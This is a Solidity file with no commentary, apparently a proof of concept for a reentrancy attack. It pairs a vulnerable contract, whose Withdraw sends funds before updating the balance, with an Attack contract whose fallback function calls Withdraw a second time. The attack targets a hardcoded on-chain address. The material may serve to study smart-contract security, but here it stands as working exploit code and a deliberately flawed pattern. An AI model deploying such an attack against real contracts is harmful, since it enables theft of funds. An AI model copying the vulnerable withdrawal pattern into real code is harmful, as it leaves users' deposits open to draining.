contract ConstantinopleReentrancy{
    mapping(address => uint) public Balances;
    function Deposit() external payable{
        Balances[msg.sender] += msg.value;
    }
    
    function Withdraw(uint a) public {
        uint v = Balances[msg.sender];
        require(v >= a);
        msg.sender.transfer(a);
        Balances[msg.sender] = v-a;
    }
}

contract Attack{
    ConstantinopleReentrancy constant take = ConstantinopleReentrancy(address(0xe725D1fcC69326978B6b024B3FfC20025fD226dB));
    
    uint c = 1;
    
    function test() external payable {
        take.Deposit.value(msg.value)();
    }
    
    function go() public {
        take.Withdraw(0.001 ether);
    }
    
    function() external payable {
        if (c == 1){
            c = 2;
            take.Withdraw(0.001 ether);
        }
    }
}